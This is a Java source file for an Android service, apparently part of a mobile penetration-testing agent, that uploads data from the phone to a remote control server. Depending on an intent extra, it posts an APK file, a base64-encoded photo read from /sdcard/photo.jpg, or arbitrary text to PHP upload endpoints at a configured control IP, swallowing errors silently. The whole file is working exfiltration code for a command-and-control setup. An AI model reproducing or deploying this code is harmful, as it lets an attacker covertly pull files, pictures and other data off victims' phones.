package com.bulbsecurity.framework;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import java.util.ArrayList;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.IBinder;
import android.util.Log;


public class WebUploadService extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		Log.i("AAA", "Started upload");	
		final String uploadstring = intent.getStringExtra("uploadstring");
		final String app = intent.getStringExtra("app");
		 new Thread() {
				public void run() {
		if (uploadstring.equals("apk to upload"))
		{
		
			String location = app;
			HttpURLConnection connection = null;
			DataOutputStream outputStream = null;
			DataInputStream inputStream = null;

			String pathToOurFile = app;
			String http = "http://";
			String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
			String path = getApplicationContext().getResources().getString(R.string.controlpath);
			String url1 = "/apkupload.php";
			String uri = http.concat(controlIP);
			String postto1 = uri.concat(path);
			String postto = postto1.concat(url1);
			String urlServer = postto;
			String lineEnd = "\r\n";
			String twoHyphens = "--";
			String boundary =  "*****";

			int bytesRead, bytesAvailable, bufferSize;
			byte[] buffer;
			int maxBufferSize = 1*1024*1024;

			try
			{
			FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile) );

			URL url = new URL(urlServer);
			connection = (HttpURLConnection) url.openConnection();

			// Allow Inputs & Outputs
			connection.setDoInput(true);
			connection.setDoOutput(true);
			connection.setUseCaches(false);

			connection.setRequestMethod("POST");

			connection.setRequestProperty("Connection", "Keep-Alive");
			connection.setRequestProperty("ENCTYPE", "multipart/form-data");
			connection.setRequestProperty("Content-Type", "multipart/form-data;boundary="+boundary);
			connection.setRequestProperty("uploaded_file", pathToOurFile);
			outputStream = new DataOutputStream( connection.getOutputStream() );
			outputStream.writeBytes(twoHyphens + boundary + lineEnd);
			outputStream.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\"" + pathToOurFile +"\"" + lineEnd);
			outputStream.writeBytes(lineEnd);

			bytesAvailable = fileInputStream.available();
			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			buffer = new byte[bufferSize];

			bytesRead = fileInputStream.read(buffer, 0, bufferSize);

			while (bytesRead > 0)
			{
			outputStream.write(buffer, 0, bufferSize);
			bytesAvailable = fileInputStream.available();
			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			}

			outputStream.writeBytes(lineEnd);
			outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

			
			String serverResponseMessage = connection.getResponseMessage();
			int serverResponseCode = connection.getResponseCode();
			Log.i("AAA", serverResponseCode + " " + serverResponseMessage);	
			

			fileInputStream.close();
			outputStream.flush();
			outputStream.close();
			}
			catch (Exception ex)
			{
			//Exception handling
			}
			
		}
		else {
			
		
		if (uploadstring.equals("picture taken"))
		{
			
			Bitmap bitmap = BitmapFactory.decodeFile("/sdcard/photo.jpg");
			ByteArrayOutputStream output = new ByteArrayOutputStream();
		
			bitmap.compress(Bitmap.CompressFormat.JPEG, 100, output);

			byte [] bytearray = output.toByteArray();

			String base =Base64.encodeBytes(bytearray);

			ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

			nameValuePairs.add(new BasicNameValuePair("picture",base));
			try{

				HttpClient httpclient = new DefaultHttpClient();
				String http = "http://";
				//String controlIP = ((AndroidAgent) this.getApplication()).getcontrolIP();
				//String path = ((AndroidAgent) this.getApplication()).getpath();
				String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
				String path = getApplicationContext().getResources().getString(R.string.controlpath);
				String url = "/pictureupload.php";
				String uri = http.concat(controlIP);
				String postto1 = uri.concat(path);
				String postto = postto1.concat(url);
				HttpPost httppost = new HttpPost(postto);
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				httpclient.execute(httppost);
				//HttpEntity entity = response.getEntity();
				//InputStream input = entity.getContent();
				}catch(Exception e){

				e.printStackTrace();

				}

		}
		else {
			
			ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
			nameValuePairs.add(new BasicNameValuePair("text", uploadstring));
			try{
				HttpClient httpclient = new DefaultHttpClient();
				String http = "http://";
				//String controlIP = ((AndroidAgent) this.getApplication()).getcontrolIP();
				//String path = ((AndroidAgent) this.getApplication()).getpath();
				String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
				String path = getApplicationContext().getResources().getString(R.string.controlpath);
				String url = "/textuploader.php";
				String uri = http.concat(controlIP);
				String postto1 = uri.concat(path);
				String postto = postto1.concat(url);
				HttpPost httppost = new HttpPost(postto);
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				httpclient.execute(httppost);
				//HttpEntity entity = response.getEntity();
				//InputStream input = entity.getContent();
				}catch(Exception e){

				e.printStackTrace();

				}
		}
			}
				};
			}.start();
				
		
}
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}

